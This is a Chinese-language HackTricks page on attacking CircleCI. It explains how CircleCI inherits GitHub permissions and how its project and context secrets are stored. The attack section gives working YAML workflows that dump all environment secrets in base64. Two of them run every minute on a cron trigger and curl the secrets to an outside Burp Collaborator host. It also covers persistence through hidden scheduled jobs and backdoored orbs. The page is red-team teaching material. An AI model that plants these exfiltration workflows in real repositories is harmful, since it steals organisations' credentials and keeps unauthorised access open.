# CircleCI安全

<details>

{% hint style="success" %}
学习并练习AWS黑客技术：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习并练习GCP黑客技术：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享黑客技巧**。

</details>
{% endhint %}

## 基本信息

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/)是一个持续集成平台，您可以使用它来**定义模板**，指示您希望它对某些代码执行何种操作以及何时执行。这样，您可以直接从您的存储库主分支**自动化测试**或**部署**。

## 权限

**CircleCI** **继承了**与登录相关的**github**和**bitbucket**的**权限**。\
在我的测试中，我发现只要您在**github**上对存储库具有**写入权限**，您就可以在**CircleCI**中**管理其项目设置**（设置新的ssh密钥，获取项目api密钥，创建具有新CircleCI配置的新分支...）。

但是，您需要是**存储库管理员**才能**将存储库转换为CircleCI项目**。

## 环境变量和秘密

根据[**文档**](https://circleci.com/docs/2.0/env-vars/)，有不同的方法可以在工作流程中**加载环境变量的值**。

### 内置环境变量

由CircleCI运行的每个容器将始终具有[**文档中定义的特定环境变量**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)，如`CIRCLE_PR_USERNAME`，`CIRCLE_PROJECT_REPONAME`或`CIRCLE_USERNAME`。

### 明文

您可以在**命令**中以明文声明它们：
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
您可以在**运行环境**中以明文形式声明它们：
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
您可以在**build-job环境**中以明文形式声明它们：
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
您可以在**容器环境**中以明文形式声明它们：
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### 项目机密

这些是只能被项目（任何分支）访问的**机密**。\
您可以在 _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ 中查看它们的声明。

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
"**导入变量**"功能允许从其他项目导入变量到此项目。
{% endhint %}

### 上下文机密

这些是**组织范围**的机密。默认情况下，任何存储在此处的机密都可以被**任何存储库**访问：

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
但请注意，可以选择一个不同的组（而不是所有成员）来**仅允许特定人员访问机密**。\
这目前是增加机密安全性的最佳方式之一，不允许每个人都访问它们，而只允许某些人访问。
{% endhint %}

## 攻击

### 搜索明文机密

如果您可以访问VCS（如github），请检查每个存储库的每个分支的`.circleci/config.yml`文件，并搜索其中存储的潜在**明文机密**。

### 机密环境变量和上下文枚举

通过检查代码，您可以找到每个`.circleci/config.yml`文件中使用的**所有机密名称**。您还可以从这些文件中获取上下文名称，或在Web控制台中检查它们：_https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_。

### 外泄项目机密

{% hint style="warning" %}
为了**外泄**所有项目和上下文**机密**，您只需要对整个github组织中的**1个存储库**具有**写入**访问权限（_并且您的帐户必须可以访问上下文，但默认情况下每个人都可以访问每个上下文_）。
{% endhint %}

{% hint style="danger" %}
"**导入变量**"功能允许从其他项目导入变量到此项目。因此，攻击者可以**从所有存储库导入所有项目变量**，然后**一起外泄所有这些变量**。
{% endhint %}

所有项目机密始终设置在作业的环境中，因此只需调用环境并将其混淆为base64，即可在**工作流Web日志控制台**中外泄机密：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
如果您**无法访问Web控制台**，但可以**访问存储库**，并且知道正在使用CircleCI，您可以**创建一个工作流**，**每分钟触发一次**，将**机密信息传送到外部地址**：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### 泄露上下文中的秘密

您需要**指定上下文名称**（这也将泄露项目的秘密）：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
如果您**无法访问Web控制台**，但可以**访问存储库**，并且知道正在使用CircleCI，您可以**修改一个每分钟触发**并**将机密信息传输到外部地址**的工作流程：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
仅在存储库中创建一个新的 `.circleci/config.yml` **并不足以触发 CircleCI 构建**。您需要在 CircleCI 控制台中**将其启用为一个项目**。
{% endhint %}

### 逃逸至云端

**CircleCI** 提供了在**他们的机器上或在您自己的机器上运行构建的选项**。\
默认情况下，他们的机器位于 GCP，最初您可能找不到任何相关信息。但是，如果受害者在**他们自己的机器上运行任务（可能是在云环境中）**，您可能会发现一个**包含有趣信息的云元数据端点**。

请注意，在前面的示例中，所有内容都是在一个 Docker 容器中启动的，但您也可以**请求启动一个 VM 机器**（可能具有不同的云权限）:
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
甚至是具有访问远程 Docker 服务权限的 Docker 容器：
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### 持久性

* 可以在CircleCI中**创建用户令牌**以使用用户权限访问API端点。
* _https://app.circleci.com/settings/user/tokens_
* 可以**创建项目令牌**以使用分配给令牌的权限访问项目。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* 可以向项目**添加SSH密钥**。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* 可以在意外项目中的隐藏分支中**创建定时任务**，每天**泄露**所有**上下文环境**变量。
* 或者甚至在分支中创建/修改已知任务，每天**泄露**所有上下文和**项目机密**。
* 如果您是GitHub所有者，可以**允许未经验证的orbs**并在作业中配置一个作为**后门**。
* 您可以在某些任务中找到**命令注入漏洞**，通过**秘密**修改其值**注入命令**

<details>

{% hint style="success" %}
学习并实践AWS黑客技术：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习并实践GCP黑客技术：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享黑客技巧。

</details>
{% endhint %}
